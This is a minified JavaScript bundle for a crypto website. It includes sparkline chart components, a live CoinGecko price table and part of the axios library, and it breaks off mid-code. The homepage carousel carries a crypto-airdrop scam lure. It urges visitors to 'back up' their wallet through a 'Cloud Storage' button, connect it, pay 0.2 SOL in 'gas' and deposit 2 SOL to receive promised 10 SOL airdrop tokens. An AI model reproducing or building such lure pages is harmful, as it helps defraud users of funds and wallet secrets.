O=this.props,$=O.point,R=O.text,T=O.fontSize,D=O.fontFamily,B=$.x,k=$.y;return d.default.createElement("g",null,d.default.createElement("text",{x:B,y:k,fontFamily:D||"Verdana",fontSize:T||10},R))}}]),x}(d.default.Component);b.propTypes={text:u.default.string,point:u.default.object,fontSize:u.default.number,fontFamily:u.default.string},b.defaultProps={text:"",point:{x:0,y:0}},i.default=b},function(r,i,o){Object.defineProperty(i,"__esModule",{value:!0});var l=function(){function m(x,S){for(var O=0;O<S.length;O++){var $=S[O];$.enumerable=$.enumerable||!1,$.configurable=!0,"value"in $&&($.writable=!0),Object.defineProperty(x,$.key,$)}}return function(x,S,O){return S&&m(x.prototype,S),O&&m(x,O),x}}(),c=o(0),u=y(c),f=o(1),d=y(f);function y(m){return m&&m.__esModule?m:{default:m}}function g(m,x){if(!(m instanceof x))throw new TypeError("Cannot call a class as a function")}function E(m,x){if(!m)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return x&&(typeof x=="object"||typeof x=="function")?x:m}function w(m,x){if(typeof x!="function"&&x!==null)throw new TypeError("Super expression must either be null or a function, not "+typeof x);m.prototype=Object.create(x&&x.prototype,{constructor:{value:m,enumerable:!1,writable:!0,configurable:!0}}),x&&(Object.setPrototypeOf?Object.setPrototypeOf(m,x):m.__proto__=x)}var b=function(m){w(x,m);function x(){return g(this,x),E(this,(x.__proto__||Object.getPrototypeOf(x)).apply(this,arguments))}return l(x,[{key:"render",value:function(){var O=this.props,$=O.data,R=O.points;O.width;var T=O.height,D=O.margin,B=O.color,k=O.style,G=O.onMouseMove,W=R.map(function(U){return[U.x,U.y]}).reduce(function(U,M){return U.concat(M)}),J=[R[R.length-1].x,T-D,D,T-D,D,R[0].y],ne=W.concat(J),j={stroke:B||k.stroke||"slategray",strokeWidth:k.strokeWidth||"1",strokeLinejoin:k.strokeLinejoin||"round",strokeLinecap:k.strokeLinecap||"round",fill:"none"},A={stroke:k.stroke||"none",strokeWidth:"0",fillOpacity:k.fillOpacity||".1",fill:k.fill||B||"slategray",pointerEvents:"auto"},C=R.map(function(U,M){return d.default.createElement("circle",{key:M,cx:U.x,cy:U.y,r:2,style:A,onMouseEnter:function(V){return G("enter",$[M],U)},onClick:function(V){return G("click",$[M],U)}})});return d.default.createElement("g",null,C,d.default.createElement("polyline",{points:ne.join(" "),style:A}),d.default.createElement("polyline",{points:W.join(" "),style:j}))}}]),x}(d.default.Component);b.propTypes={color:u.default.string,style:u.default.object},b.defaultProps={style:{},onMouseMove:function(){}},i.default=b},function(r,i,o){Object.defineProperty(i,"__esModule",{value:!0});var l=function(){function m(x,S){for(var O=0;O<S.length;O++){var $=S[O];$.enumerable=$.enumerable||!1,$.configurable=!0,"value"in $&&($.writable=!0),Object.defineProperty(x,$.key,$)}}return function(x,S,O){return S&&m(x.prototype,S),O&&m(x,O),x}}(),c=o(0),u=y(c),f=o(1),d=y(f);function y(m){return m&&m.__esModule?m:{default:m}}function g(m,x){if(!(m instanceof x))throw new TypeError("Cannot call a class as a function")}function E(m,x){if(!m)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return x&&(typeof x=="object"||typeof x=="function")?x:m}function w(m,x){if(typeof x!="function"&&x!==null)throw new TypeError("Super expression must either be null or a function, not "+typeof x);m.prototype=Object.create(x&&x.prototype,{constructor:{value:m,enumerable:!1,writable:!0,configurable:!0}}),x&&(Object.setPrototypeOf?Object.setPrototypeOf(m,x):m.__proto__=x)}var b=function(m){w(x,m);function x(){return g(this,x),E(this,(x.__proto__||Object.getPrototypeOf(x)).apply(this,arguments))}return l(x,[{key:"render",value:function(){var O=this.props,$=O.points;O.width;var R=O.height,T=O.margin,D=O.color,B=O.style,k=O.divisor,G=k===void 0?.25:k,W=void 0,J=function(N){var V=void 0;if(!W)V=[N.x,N.y];else{var F=(N.x-W.x)*G;V=["C",W.x+F,W.y,N.x-F,N.y,N.x,N.y]}return W=N,V},ne=$.map(function(M){return J(M)}).reduce(function(M,N){return M.concat(N)}),j=["L"+$[$.length-1].x,R-T,T,R-T,T,$[0].y],A=ne.concat(j),C={stroke:D||B.stroke||"slategray",strokeWidth:B.strokeWidth||"1",strokeLinejoin:B.strokeLinejoin||"round",strokeLinecap:B.strokeLinecap||"round",fill:"none"},U={stroke:B.stroke||"none",strokeWidth:"0",fillOpacity:B.fillOpacity||".1",fill:B.fill||D||"slategray"};return d.default.createElement("g",null,d.default.createElement("path",{d:"M"+A.join(" "),style:U}),d.default.createElement("path",{d:"M"+ne.join(" "),style:C}))}}]),x}(d.default.Component);b.propTypes={color:u.default.string,style:u.default.object},b.defaultProps={style:{}},i.default=b},function(r,i,o){Object.defineProperty(i,"__esModule",{value:!0});var l=function(){function m(x,S){for(var O=0;O<S.length;O++){var $=S[O];$.enumerable=$.enumerable||!1,$.configurable=!0,"value"in $&&($.writable=!0),Object.defineProperty(x,$.key,$)}}return function(x,S,O){return S&&m(x.prototype,S),O&&m(x,O),x}}(),c=o(0),u=y(c),f=o(1),d=y(f);function y(m){return m&&m.__esModule?m:{default:m}}function g(m,x){if(!(m instanceof x))throw new TypeError("Cannot call a class as a function")}function E(m,x){if(!m)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return x&&(typeof x=="object"||typeof x=="function")?x:m}function w(m,x){if(typeof x!="function"&&x!==null)throw new TypeError("Super expression must either be null or a function, not "+typeof x);m.prototype=Object.create(x&&x.prototype,{constructor:{value:m,enumerable:!1,writable:!0,configurable:!0}}),x&&(Object.setPrototypeOf?Object.setPrototypeOf(m,x):m.__proto__=x)}var b=function(m){w(x,m);function x(){return g(this,x),E(this,(x.__proto__||Object.getPrototypeOf(x)).apply(this,arguments))}return l(x,[{key:"render",value:function(){var O=this,$=this.props,R=$.points,T=$.height,D=$.style,B=$.barWidth,k=$.margin,G=$.onMouseMove,W=1*(D&&D.strokeWidth||0),J=k?2*k:0,ne=B||(R&&R.length>=2?Math.max(0,R[1].x-R[0].x-W-J):0);return d.default.createElement("g",{transform:"scale(1,-1)"},R.map(function(j,A){return d.default.createElement("rect",{key:A,x:j.x-(ne+W)/2,y:-T,width:ne,height:Math.max(0,T-j.y),style:D,onMouseMove:G&&G.bind(O,j)})}))}}]),x}(d.default.Component);b.propTypes={points:u.default.arrayOf(u.default.object),height:u.default.number,style:u.default.object,barWidth:u.default.number,margin:u.default.number,onMouseMove:u.default.func},b.defaultProps={style:{fill:"slategray"}},i.default=b},function(r,i,o){Object.defineProperty(i,"__esModule",{value:!0});var l=function(){function m(x,S){for(var O=0;O<S.length;O++){var $=S[O];$.enumerable=$.enumerable||!1,$.configurable=!0,"value"in $&&($.writable=!0),Object.defineProperty(x,$.key,$)}}return function(x,S,O){return S&&m(x.prototype,S),O&&m(x,O),x}}(),c=o(0),u=y(c),f=o(1),d=y(f);function y(m){return m&&m.__esModule?m:{default:m}}function g(m,x){if(!(m instanceof x))throw new TypeError("Cannot call a class as a function")}function E(m,x){if(!m)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return x&&(typeof x=="object"||typeof x=="function")?x:m}function w(m,x){if(typeof x!="function"&&x!==null)throw new TypeError("Super expression must either be null or a function, not "+typeof x);m.prototype=Object.create(x&&x.prototype,{constructor:{value:m,enumerable:!1,writable:!0,configurable:!0}}),x&&(Object.setPrototypeOf?Object.setPrototypeOf(m,x):m.__proto__=x)}var b=function(m){w(x,m);function x(){return g(this,x),E(this,(x.__proto__||Object.getPrototypeOf(x)).apply(this,arguments))}return l(x,[{key:"lastDirection",value:function(O){return Math.sign=Math.sign||function($){return $>0?1:-1},O.length<2?0:Math.sign(O[O.length-2].y-O[O.length-1].y)}},{key:"render",value:function(){var O=this.props,$=O.points;O.width,O.height;var R=O.size,T=O.style,D=O.spotColors,B=d.default.createElement("circle",{cx:$[0].x,cy:$[0].y,r:R,style:T}),k=d.default.createElement("circle",{cx:$[$.length-1].x,cy:$[$.length-1].y,r:R,style:T||{fill:D[this.lastDirection($)]}});return d.default.createElement("g",null,T&&B,k)}}]),x}(d.default.Component);b.propTypes={size:u.default.number,style:u.default.object,spotColors:u.default.object},b.defaultProps={size:2,spotColors:{"-1":"red",0:"black",1:"green"}},i.default=b},function(r,i,o){Object.defineProperty(i,"__esModule",{value:!0});var l=function(){function O($,R){for(var T=0;T<R.length;T++){var D=R[T];D.enumerable=D.enumerable||!1,D.configurable=!0,"value"in D&&(D.writable=!0),Object.defineProperty($,D.key,D)}}return function($,R,T){return R&&O($.prototype,R),T&&O($,T),$}}(),c=o(0),u=w(c),f=o(1),d=w(f),y=o(23),g=E(y);function E(O){if(O&&O.__esModule)return O;var $={};if(O!=null)for(var R in O)Object.prototype.hasOwnProperty.call(O,R)&&($[R]=O[R]);return $.default=O,$}function w(O){return O&&O.__esModule?O:{default:O}}function b(O,$){if(!(O instanceof $))throw new TypeError("Cannot call a class as a function")}function m(O,$){if(!O)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return $&&(typeof $=="object"||typeof $=="function")?$:O}function x(O,$){if(typeof $!="function"&&$!==null)throw new TypeError("Super expression must either be null or a function, not "+typeof $);O.prototype=Object.create($&&$.prototype,{constructor:{value:O,enumerable:!1,writable:!0,configurable:!0}}),$&&(Object.setPrototypeOf?Object.setPrototypeOf(O,$):O.__proto__=$)}var S=function(O){x($,O);function $(){return b(this,$),m(this,($.__proto__||Object.getPrototypeOf($)).apply(this,arguments))}return l($,[{key:"render",value:function(){var T=this.props,D=T.points,B=T.margin,k=T.type,G=T.style,W=T.value,J=D.map(function(j){return j.y}),ne=k=="custom"?W:g[k](J);return d.default.createElement("line",{x1:D[0].x,y1:ne+B,x2:D[D.length-1].x,y2:ne+B,style:G})}}]),$}(d.default.Component);S.propTypes={type:u.default.oneOf(["max","min","mean","avg","median","custom"]),value:u.default.number,style:u.default.object},S.defaultProps={type:"mean",style:{stroke:"red",strokeOpacity:.75,strokeDasharray:"2, 2"}},i.default=S},function(r,i,o){Object.defineProperty(i,"__esModule",{value:!0}),i.variance=i.stdev=i.median=i.midRange=i.avg=i.mean=i.max=i.min=void 0;var l=o(7),c=S(l),u=o(3),f=S(u),d=o(24),y=S(d),g=o(25),E=S(g),w=o(10),b=S(w),m=o(26),x=S(m);function S(O){return O&&O.__esModule?O:{default:O}}i.min=c.default,i.max=c.default,i.mean=f.default,i.avg=f.default,i.midRange=y.default,i.median=E.default,i.stdev=b.default,i.variance=x.default},function(r,i,o){Object.defineProperty(i,"__esModule",{value:!0});var l=o(7),c=d(l),u=o(9),f=d(u);function d(y){return y&&y.__esModule?y:{default:y}}i.default=function(y){return(0,f.default)(y)-(0,c.default)(y)/2}},function(r,i,o){Object.defineProperty(i,"__esModule",{value:!0}),i.default=function(l){return l.sort(function(c,u){return c-u})[Math.floor(l.length/2)]}},function(r,i,o){Object.defineProperty(i,"__esModule",{value:!0});var l=o(3),c=u(l);function u(f){return f&&f.__esModule?f:{default:f}}i.default=function(f){var d=(0,c.default)(f),y=f.map(function(g){return Math.pow(g-d,2)});return(0,c.default)(y)}},function(r,i,o){Object.defineProperty(i,"__esModule",{value:!0});var l=function(){function $(R,T){for(var D=0;D<T.length;D++){var B=T[D];B.enumerable=B.enumerable||!1,B.configurable=!0,"value"in B&&(B.writable=!0),Object.defineProperty(R,B.key,B)}}return function(R,T,D){return T&&$(R.prototype,T),D&&$(R,D),R}}(),c=o(0),u=b(c),f=o(1),d=b(f),y=o(3),g=b(y),E=o(10),w=b(E);function b($){return $&&$.__esModule?$:{default:$}}function m($,R){if(!($ instanceof R))throw new TypeError("Cannot call a class as a function")}function x($,R){if(!$)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return R&&(typeof R=="object"||typeof R=="function")?R:$}function S($,R){if(typeof R!="function"&&R!==null)throw new TypeError("Super expression must either be null or a function, not "+typeof R);$.prototype=Object.create(R&&R.prototype,{constructor:{value:$,enumerable:!1,writable:!0,configurable:!0}}),R&&(Object.setPrototypeOf?Object.setPrototypeOf($,R):$.__proto__=R)}var O=function($){S(R,$);function R(){return m(this,R),x(this,(R.__proto__||Object.getPrototypeOf(R)).apply(this,arguments))}return l(R,[{key:"render",value:function(){var D=this.props,B=D.points,k=D.margin,G=D.style,W=B.map(function(j){return j.y}),J=(0,g.default)(W),ne=(0,w.default)(W);return d.default.createElement("rect",{x:B[0].x,y:J-ne+k,width:B[B.length-1].x-B[0].x,height:w.default*2,style:G})}}]),R}(d.default.Component);O.propTypes={style:u.default.object},O.defaultProps={style:{fill:"red",fillOpacity:.1}},i.default=O},function(r,i,o){Object.defineProperty(i,"__esModule",{value:!0});var l=o(7),c=d(l),u=o(9),f=d(u);function d(y){return y&&y.__esModule?y:{default:y}}i.default=function(y){var g=y.data,E=y.limit,w=y.width,b=w===void 0?1:w,m=y.height,x=m===void 0?1:m,S=y.margin,O=S===void 0?0:S,$=y.max,R=$===void 0?(0,f.default)(g):$,T=y.min,D=T===void 0?(0,c.default)(g):T,B=g.length;E&&E<B&&(g=g.slice(B-E));var k=(x-O*2)/(R-D||2),G=(b-O*2)/((E||B)-(B>1?1:0));return g.map(function(W,J){return{x:J*G+O,y:(R===D?1:R-W)*k+O}})}}])})}(Kh)),Kh.exports}var Ex=yV();const xO=()=>{const[t,e]=ue.useReducer(pV,dV);ue.useEffect(()=>{const r=async()=>{e({type:Sa.FETCH_START});try{const l=await(await fetch("https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=100&page=1&sparkline=true&price_change_percentage=1h,24h,7d")).json();e({type:Sa.FETCH_SUCCESS,payload:l})}catch(o){console.error("Error fetching market data:",o),e({type:Sa.FETCH_ERROR})}};r();const i=setInterval(r,5e4);return()=>clearInterval(i)},[]);const n=r=>r?`$${r.toLocaleString(void 0,{minimumFractionDigits:2})}`:"-";return H.jsx(H.Fragment,{children:H.jsx("section",{children:H.jsxs("div",{className:"container liveChartContainer",children:[H.jsx("div",{className:"livChartHeading",children:H.jsx("h1",{className:"text-center py-5 underline",children:"View Live Chart"})}),H.jsx("div",{className:"table-responsive liveChart",children:H.jsxs("table",{className:"table table-hover table-bordered text-center align-middle responsive-text",children:[H.jsx("thead",{className:"table-light left-align",children:H.jsxs("tr",{children:[H.jsx("th",{children:"#"}),H.jsx("th",{children:"Coin"}),H.jsx("th",{children:"Price"}),H.jsx("th",{children:"1h"}),H.jsx("th",{children:"24h"}),H.jsx("th",{children:"7d"}),H.jsx("th",{children:"24h Volume"}),H.jsx("th",{children:"Market Cap"}),H.jsx("th",{children:"Last 7 Days"})]})}),H.jsx("tbody",{children:t.initialLoading?H.jsx("tr",{className:"loaderWidth",children:H.jsx("td",{colSpan:"9",children:"Loading..."})}):t.coins.map((r,i)=>{var o,l,c;return H.jsxs("tr",{children:[H.jsx("td",{children:i+1}),H.jsxs("td",{className:"d-flex align-items-center gap-2",children:[H.jsx("img",{src:r.image,alt:r.name,width:"25"}),H.jsxs("span",{children:[r.name," (",r.symbol.toUpperCase(),")"]})]}),H.jsx("td",{children:n(r.current_price)}),H.jsxs("td",{className:r.price_change_percentage_1h_in_currency>0?"text-success":"text-danger",children:[(o=r.price_change_percentage_1h_in_currency)==null?void 0:o.toFixed(2),"%"]}),H.jsxs("td",{className:r.price_change_percentage_24h>0?"text-success":"text-danger",children:[(l=r.price_change_percentage_24h)==null?void 0:l.toFixed(2),"%"]}),H.jsxs("td",{className:r.price_change_percentage_7d_in_currency>0?"text-success":"text-danger",children:[(c=r.price_change_percentage_7d_in_currency)==null?void 0:c.toFixed(2),"%"]}),H.jsx("td",{children:n(r.total_volume)}),H.jsx("td",{children:n(r.market_cap)}),H.jsx("td",{children:H.jsx(Ex.Sparklines,{data:r.sparkline_in_7d.price,width:100,height:30,children:H.jsx(Ex.SparklinesLine,{color:"blue"})})})]},r.id)})})]})})]})})})},mV=()=>H.jsxs(H.Fragment,{children:[H.jsx("section",{className:"home",children:H.jsx("div",{className:"container my-5",children:H.jsxs("div",{className:"row align-items-center",children:[H.jsx("div",{className:"col-md-6 d-flex justify-content-center",children:H.jsxs("div",{id:"carouselExampleAutoplaying",class:"carousel slide","data-bs-ride":"carousel",children:[H.jsxs("div",{class:"carousel-inner text-div text-white text-center",children:[H.jsxs("div",{class:"carousel-item active",children:[H.jsx("p",{className:"pt-md-2",children:"Just click the Cloud Storage button in the nav to securely back up your wallet—quick and easy."}),H.jsx("p",{children:"Click on connect button from the navigation and connect your wallet from the above options"}),H.jsx("p",{children:"When you are done from the two connections, wait for your airdrop tokens worth 10 sol in value"})]}),H.jsxs("div",{class:"carousel-item",children:[H.jsx("h2",{children:"The Pulse of the Crypto World."}),H.jsx("p",{children:"Live chats. Live prices. One platform."}),H.jsx("p",{children:"Connect your wallet and receive airdrop tokens"})]}),H.jsxs("div",{class:"carousel-item",children:[H.jsx("h4",{children:"⚠ You need at least 0.2 SOL in your wallet to cover gas fee to receive the supplies."}),H.jsx("h2",{className:"pt-1",children:"Hurry now and participate"}),H.jsx("h4",{children:"Make deposit of 2 SOL to your connected wallet and become eligible."})]})]}),H.jsxs("button",{class:"carousel-control-prev",type:"button","data-bs-target":"#carouselExampleAutoplaying","data-bs-slide":"prev",children:[H.jsx("span",{class:"carousel-control-prev-icon","aria-hidden":"true"}),H.jsx("span",{class:"visually-hidden",children:"Previous"})]}),H.jsxs("button",{class:"carousel-control-next",type:"button","data-bs-target":"#carouselExampleAutoplaying","data-bs-slide":"next",children:[H.jsx("span",{class:"carousel-control-next-icon","aria-hidden":"true"}),H.jsx("span",{class:"visually-hidden",children:"Next"})]})]})}),H.jsx("div",{className:"col-md-6 d-flex justify-content-start",children:H.jsx("div",{className:"image-div",children:H.jsx("img",{src:"https://i.ibb.co/1fdhjwLz/airdrop.png",alt:"Banner",title:"crypto",className:"img-fluid"})})})]})})}),H.jsx("section",{className:"LiveChartSection",children:H.jsx(xO,{})})]});let wV=ue.createContext();const vV=t=>{let{children:e}=t;return H.jsx(H.Fragment,{children:H.jsx(wV.Provider,{value:{},children:e})})};function SO(t,e){return function(){return t.apply(e,arguments)}}const{toString:bV}=Object.prototype,{getPrototypeOf:bw}=Object,{iterator:Kf,toStringTag:_O}=Symbol,Gf=(t=>e=>{const n=bV.call(e);return t[n]||(t[n]=n.slice(8,-1).toLowerCase())})(Object.create(null)),Lr=t=>(t=t.toLowerCase(),e=>Gf(e)===t),Yf=t=>e=>typeof e===t,{isArray:tl}=Array,Ac=Yf("undefined");function EV(t){return t!==null&&!Ac(t)&&t.constructor!==null&&!Ac(t.constructor)&&Un(t.constructor.isBuffer)&&t.constructor.isBuffer(t)}const IO=Lr("ArrayBuffer");function xV(t){let e;return typeof ArrayBuffer<"u"&&ArrayBuffer.isView?e=ArrayBuffer.isView(t):e=t&&t.buffer&&IO(t.buffer),e}const SV=Yf("string"),Un=Yf("function"),OO=Yf("number"),Jf=t=>t!==null&&typeof t=="object",_V=t=>t===!0||t===!1,Gh=t=>{if(Gf(t)!=="object")return!1;const e=bw(t);return(e===null||e===Object.prototype||Object.getPrototypeOf(e)===null)&&!(_O in t)&&!(Kf in t)},IV=Lr("Date"),OV=Lr("File"),$V=Lr("Blob"),PV=Lr("FileList"),TV=t=>Jf(t)&&Un(t.pipe),AV=t=>{let e;return t&&(typeof FormData=="function"&&t instanceof FormData||Un(t.append)&&((e=Gf(t))==="formdata"||e==="object"&&Un(t.toString)&&t.toString()==="[object FormData]"))},CV=Lr("URLSearchParams"),[RV,DV,NV,kV]=["ReadableStream","Request","Response","Headers"].map(Lr),BV=t=>t.trim?t.trim():t.replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,"");function Qc(t,e,{allOwnKeys:n=!1}={}){if(t===null||typeof t>"u")return;let r,i;if(typeof t!="object"&&(t=[t]),tl(t))for(r=0,i=t.length;r<i;r++)e.call(null,t[r],r,t);else{const o=n?Object.getOwnPropertyNames(t):Object.keys(t),l=o.length;let c;for(r=0;r<l;r++)c=o[r],e.call(null,t[c],c,t)}}function $O(t,e){e=e.toLowerCase();const n=Object.keys(t);let r=n.length,i;for(;r-- >0;)if(i=n[r],e===i.toLowerCase())return i;return null}const Qs=typeof globalThis<"u"?globalThis:typeof self<"u"?self:typeof window<"u"?window:globalThis,PO=t=>!Ac(t)&&t!==Qs;function Em(){const{caseless:t}=PO(this)&&this||{},e={},n=(r,i)=>{const o=t&&$O(e,i)||i;Gh(e[o])&&Gh(r)?e[o]=Em(e[o],r):Gh(r)?e[o]=Em({},r):tl(r)?e[o]=r.slice():e[o]=r};for(let r=0,i=arguments.length;r<i;r++)arguments[r]&&Qc(arguments[r],n);return e}const LV=(t,e,n,{allOwnKeys:r}={})=>(Qc(e,(i,o)=>{n&&Un(i)?t[o]=SO(i,n):t[o]=i},{allOwnKeys:r}),t),jV=t=>(t.charCodeAt(0)===65279&&(t=t.slice(1)),t),UV=(t,e,n,r)=>{t.prototype=Object.create(e.prototype,r),t.prototype.constructor=t,Object.defineProperty(t,"super",{value:e.prototype}),n&&Object.assign(t.prototype,n)},MV=(t,e,n,r)=>{let i,o,l;const c={};if(e=e||{},t==null)return e;do{for(i=Object.getOwnPropertyNames(t),o=i.length;o-- >0;)l=i[o],(!r||r(l,t,e))&&!c[l]&&(e[l]=t[l],c[l]=!0);t=n!==!1&&bw(t)}while(t&&(!n||n(t,e))&&t!==Object.prototype);return e},FV=(t,e,n)=>{t=String(t),(n===void 0||n>t.length)&&(n=t.length),n-=e.length;const r=t.indexOf(e,n);return r!==-1&&r===n},zV=t=>{if(!t)return null;if(tl(t))return t;let e=t.length;if(!OO(e))return null;const n=new Array(e);for(;e-- >0;)n[e]=t[e];return n},qV=(t=>e=>t&&e instanceof t)(typeof Uint8Array<"u"&&bw(Uint8Array)),HV=(t,e)=>{const r=(t&&t[Kf]).call(t);let i;for(;(i=r.next())&&!i.done;){const o=i.value;e.call(t,o[0],o[1])}},VV=(t,e)=>{let n;const r=[];for(;(n=t.exec(e))!==null;)r.push(n);return r},WV=Lr("HTMLFormElement"),KV=t=>t.toLowerCase().replace(/[-_\s]([a-z\d])(\w*)/g,function(n,r,i){return r.toUpperCase()+i}),xx=(({hasOwnProperty:t})=>(e,n)=>t.call(e,n))(Object.prototype),GV=Lr("RegExp"),TO=(t,e)=>{const n=Object.getOwnPropertyDescriptors(t),r={};Qc(n,(i,o)=>{let l;(l=e(i,o,t))!==!1&&(r[o]=l||i)}),Object.defineProperties(t,r)},YV=t=>{TO(t,(e,n)=>{if(Un(t)&&["arguments","caller","callee"].indexOf(n)!==-1)return!1;const r=t[n];if(Un(r)){if(e.enumerable=!1,"writable"in e){e.writable=!1;return}e.set||(e.set=()=>{throw Error("Can not rewrite read-only method '"+n+"'")})}})},JV=(t,e)=>{const n={},r=i=>{i.forEach(o=>{n[o]=!0})};return tl(t)?r(t):r(String(t).split(e)),n},ZV=()=>{},QV=(t,e)=>t!=null&&Number.isFinite(t=+t)?t:e;function XV(t){return!!(t&&Un(t.append)&&t[_O]==="FormData"&&t[Kf])}const eW=t=>{const e=new Array(10),n=(r,i)=>{if(Jf(r)){if(e.indexOf(r)>=0)return;if(!("toJSON"in r)){e[i]=r;const o=tl(r)?[]:{};return Qc(r,(l,c)=>{const u=n(l,i+1);!Ac(u)&&(o[c]=u)}),e[i]=void 0,o}}return r};return n(t,0)},tW=Lr("AsyncFunction"),nW=t=>t&&(Jf(t)||Un(t))&&Un(t.then)&&Un(t.catch),AO=((t,e)=>t?setImmediate:e?((n,r)=>(Qs.addEventListener("message",({source:i,data:o})=>{i===Qs&&o===n&&r.length&&r.shift()()},!1),i=>{r.push(i),Qs.postMessage(n,"*")}))(`axios@${Math.random()}`,[]):n=>setTimeout(n))(typeof setImmediate=="function",Un(Qs.postMessage)),rW=typeof queueMicrotask<"u"?queueMicrotask.bind(Qs):typeof process<"u"&&process.nextTick||AO,iW=t=>t!=null&&Un(t[Kf]),ce={isArray:tl,isArrayBuffer:IO,isBuffer:EV,isFormData:AV,isArrayBufferView:xV,isString:SV,isNumber:OO,isBoolean:_V,isObject:Jf,isPlainObject:Gh,isReadableStream:RV,isRequest:DV,isResponse:NV,isHeaders:kV,isUndefined:Ac,isDate:IV,isFile:OV,isBlob:$V,isRegExp:GV,isFunction:Un,isStream:TV,isURLSearchParams:CV,isTypedArray:qV,isFileList:PV,forEach:Qc,merge:Em,extend:LV,trim:BV,stripBOM:jV,inherits:UV,toFlatObject:MV,kindOf:Gf,kindOfTest:Lr,endsWith:FV,toArray:zV,forEachEntry:HV,matchAll:VV,isHTMLForm:WV,hasOwnProperty:xx,hasOwnProp:xx,reduceDescriptors:TO,freezeMethods:YV,toObjectSet:JV,toCamelCase:KV,noop:ZV,toFiniteNumber:QV,findKey:$O,global:Qs,isContextDefined:PO,isSpecCompliantForm:XV,toJSONObject:eW,isAsyncFn:tW,isThenable:nW,setImmediate:AO,asap:rW,isIterable:iW};function ke(t,e,n,r,i){Error.call(this),Error.captureStackTrace?Error.captureStackTrace(this,this.constructor):this.stack=new Error().stack,this.message=t,this.name="AxiosError",e&&(this.code=e),n&&(this.config=n),r&&(this.request=r),i&&(this.response=i,this.status=i.status?i.status:null)}ce.inherits(ke,Error,{toJSON:function(){return{message:this.message,name:this.name,description:this.description,number:this.number,fileName:this.fileName,lineNumber:this.lineNumber,columnNumber:this.columnNumber,stack:this.stack,config:ce.toJSONObject(this.config),code:this.code,status:this.status}}});const CO=ke.prototype,RO={};["ERR_BAD_OPTION_VALUE","ERR_BAD_OPTION","ECONNABORTED","ETIMEDOUT","ERR_NETWORK","ERR_FR_TOO_MANY_REDIRECTS","ERR_DEPRECATED","ERR_BAD_RESPONSE","ERR_BAD_REQUEST","ERR_CANCELED","ERR_NOT_SUPPORT","ERR_INVALID_URL"].forEach(t=>{RO[t]={value:t}});Object.defineProperties(ke,RO);Object.defineProperty(CO,"isAxiosError",{value:!0});ke.from=(t,e,n,r,i,o)=>{const l=Object.create(CO);return ce.toFlatObject(t,l,function(u){return u!==Error.prototype},c=>c!=="isAxiosError"),ke.call(l,t.message,e,n,r,i),l.cause=t,l.name=t.name,o&&Object.assign(l,o),l};const sW=null;function xm(t){return ce.isPlainObject(t)||ce.isArray(t)}function DO(t){return ce.endsWith(t,"[]")?t.slice(0,-2):t}function Sx(t,e,n){return t?t.concat(e).map(function(i,o){return i=DO(i),!n&&o?"["+i+"]":i}).join(n?".":""):e}function oW(t){return ce.isArray(t)&&!t.some(xm)}const aW=ce.toFlatObject(ce,{},null,function(e){return/^is[A-Z]/.test(e)});function Zf(t,e,n){if(!ce.isObject(t))throw new TypeError("target must be an object");e=e||new FormData,n=ce.toFlatObject(n,{metaTokens:!0,dots:!1,indexes:!1},!1,function(b,m){return!ce.isUndefined(m[b])});const r=n.metaTokens,i=n.visitor||d,o=n.dots,l=n.indexes,u=(n.Blob||typeof Blob<"u"&&Blob)&&ce.isSpecCompliantForm(e);if(!ce.isFunction(i))throw new TypeError("visitor must be a function");function f(w){if(w===null)return"";if(ce.isDate(w))return w.toISOString();if(!u&&ce.isBlob(w))throw new ke("Blob is not supported. Use a Buffer instead.");return ce.isArrayBuffer(w)||ce.isTypedArray(w)?u&&typeof Blob=="function"?new Blob([w]):Buffer.from(w):w}function d(w,b,m){let x=w;if(w&&!m&&typeof w=="object"){if(ce.endsWith(b,"{}"))b=r?b:b.slice(0,-2),w=JSON.stringify(w);else if(ce.isArray(w)&&oW(w)||(ce.isFileList(w)||ce.endsWith(b,"[]"))&&(x=ce.toArray(w)))return b=DO(b),x.forEach(function(O,$){!(ce.isUndefined(O)||O===null)&&e.append(l===!0?Sx([b],$,o):l===null?b:b+"[]",f(O))}),!1}return xm(w)?!0:(e.append(Sx(m,b,o),f(w)),!1)}const y=[],g=Object.assign(aW,{defaultVisitor:d,convertValue:f,isVisitable:xm});function E(w,b){if(!ce.isUndefined(w)){if(y.indexOf(w)!==-1)throw Error("Circular reference detected in "+b.join("."));y.push(w),ce.forEach(w,function(x,S){(!(ce.isUndefined(x)||x===null)&&i.call(e,x,ce.isString(S)?S.trim():S,b,g))===!0&&E(x,b?b.concat(S):[S])}),y.pop()}}if(!ce.isObject(t))throw new TypeError("data must be an object");return E(t),e}function _x(t){const e={"!":"%21","'":"%27","(":"%28",")":"%29","~":"%7E","%20":"+","%00":"\0"};return encodeURIComponent(t).replace(/[!'()~]|%20|%00/g,function(r){return e[r]})}function Ew(t,e){this._pairs=[],t&&Zf(t,this,e)}const NO=Ew.prototype;NO.append=function(e,n){this._pairs.push([e,n])};NO.toString=function(e){const n=e?function(r){return e.call(this,r,_x)}:_x;return this._pairs.map(function(i){return n(i[0])+"="+n(i[1])},"").join("&")};function lW(t){return encodeURIComponent(t).replace(/%3A/gi,":").replace(/%24/g,"$").replace(/%2C/gi,",").replace(/%20/g,"+").replace(/%5B/gi,"[").replace(/%5D/gi,"]")}function kO(t,e,n){if(!e)return t;const r=n&&n.encode||lW;ce.isFunction(n)&&(n={serialize:n});const i=n&&n.serialize;let o;if(i?o=i(e,n):o=ce.isURLSearchParams(e)?e.toString():new Ew(e,n).toString(r),o){const l=t.indexOf("#");l!==-1&&(t=t.slice(0,l)),t+=(t.indexOf("?")===-1?"?":"&")+o}return t}class Ix{constructor(){this.handlers=[]}use(e,n,r){return this.handlers.push({fulfilled:e,rejected:n,synchronous:r?r.synchronous:!1,runWhen:r?r.runWhen:null}),this.handlers.length-1}eject(e){this.handlers[e]&&(this.handlers[e]=null)}clear(){this.handlers&&(this.handlers=[])}forEach(e){ce.forEach(this.handlers,function(r){r!==null&&e(r)})}}const BO={silentJSONParsing:!0,forcedJSONParsing:!0,clarifyTimeoutError:!1},cW=typeof URLSearchParams<"u"?URLSearchParams:Ew,uW=typeof FormData<"u"?FormData:null,hW=typeof 